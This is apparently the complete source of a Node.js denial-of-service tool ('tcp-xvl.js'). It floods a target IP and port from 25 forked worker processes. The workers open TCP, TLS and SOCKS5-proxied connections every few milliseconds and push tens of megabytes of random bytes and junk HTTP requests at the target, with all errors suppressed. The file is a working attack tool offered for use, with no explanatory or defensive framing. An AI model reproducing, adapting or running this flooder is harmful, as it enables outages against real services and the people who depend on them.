const fs = require('fs');
const net = require('net');
const tls = require('tls');
const zlib = require('zlib');
const crypto = require('crypto');
const cluster = require('cluster');
const { Readable } = require('stream');
const gradient = require("gradient-string")

var ip = process.argv[2];
var port = parseInt(process.argv[3]);
var duration = parseInt(process.argv[4]);
var proxyFile = process.argv[5];
if (!ip || !port || !duration) {
    console.log(gradient.atlas("Usage: node tcp-xvl.js <ip> <port> <duration> [proxy_file]"));
    process.exit();
}
let proxies = [];
if (proxyFile && fs.existsSync(proxyFile)) {
    proxies = fs.readFileSync(proxyFile, 'utf-8').split(/\r?\n/).filter(Boolean);
}
function Sokcs5Connect(proxy, targetHost, targetPort, onConnect) {
    const [proxyHost, proxyPort] = proxy.split(':');
    const socket = new net.Socket();
    socket.connect(parseInt(proxyPort), proxyHost, () => {
        socket.write(Buffer.from([0x05, 0x01, 0x00]));
    });
    socket.on('data', (data) => {
        if (data[0] === 0x05 && data[1] === 0x00 && data.length === 2) {
            const addr = targetHost.split('.').map(octet => parseInt(octet));
            const portBuf = Buffer.alloc(2);
            portBuf.writeUInt16BE(targetPort, 0);
            socket.write(Buffer.concat([
                Buffer.from([0x05, 0x01, 0x00, 0x01]),
                Buffer.from(addr),
                portBuf
            ]));
        } else if (data[0] === 0x05 && data[1] === 0x00) {
          onConnect(socket);
        }
    });
    socket.on('error', () => socket.destroy());
    return socket;
}
function generateBufferSet() {
    return {
        raw: crypto.randomBytes(1024 * 1024 * 60),
        deflated: zlib.deflateSync(crypto.randomBytes(1024 * 1024 * 30)),
        hexFlood: Buffer.from('ff'.repeat(1024 * 1024), 'hex')
    };
}
function startmainddus() {
    const set = generateBufferSet();
    if (proxies.length > 0) {
        setInterval(() => {
            var proxy = proxies[Math.floor(Math.random() * proxies.length)];
            Sokcs5Connect(proxy, ip, port, (sock) => {
                sock.write(set.raw);
                sock.write(set.deflated);
                sock.write(set.hexFlood);
            });
        }, 10);
        setInterval(() => {
            var proxy = proxies[Math.floor(Math.random() * proxies.length)];
            Sokcs5Connect(proxy, ip, port, (sock) => {
                sock.write(set.raw.slice(0, 4096));
                sock.write("GET / HTTP/1.1\r\nHost: " + ip + "\r\n\r\n");
            });
        }, 30);
        setInterval(() => {
            var proxy = proxies[Math.floor(Math.random() * proxies.length)];
            Sokcs5Connect(proxy, ip, port, (sock) => {
                var stream = Readable.from(set.raw);
                stream.pipe(sock);
            });
        }, 20);

    } else {
        setInterval(() => {
            var socket = new net.Socket();
            socket.connect(port, ip, () => {
                socket.write(set.raw);
                socket.write(set.deflated);
                socket.write(set.hexFlood);
            });
            socket.on('error', () => {});
            setTimeout(() => socket.destroy(), 3000);
        }, 10);
        setInterval(() => {
            var socket = tls.connect({
                host: ip,
                port: port,
                rejectUnauthorized: false
            }, () => {
                socket.write(set.raw.slice(0, 4096));
                socket.write("GET / HTTP/1.1\r\nHost: " + ip + "\r\n\r\n");
            });
            socket.on('error', () => {});
            setTimeout(() => socket.destroy(), 2500);
        }, 30);
        setInterval(() => {
            var sock = new net.Socket();
            sock.connect(port, ip, () => {
                var stream = Readable.from(set.raw);
                stream.pipe(sock);
            });
            sock.on('error', () => {});
            setTimeout(() => sock.destroy(), 2500);
        }, 20);
    }
}
if (cluster.isMaster) {
    console.log(`Kiss Server: ${ip}:${port} for ${duration}s`);
    for (let i = 0; i < 25; i++) cluster.fork();
    setTimeout(() => process.exit(), duration * 1000);
} else {
    startmainddus();
}

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});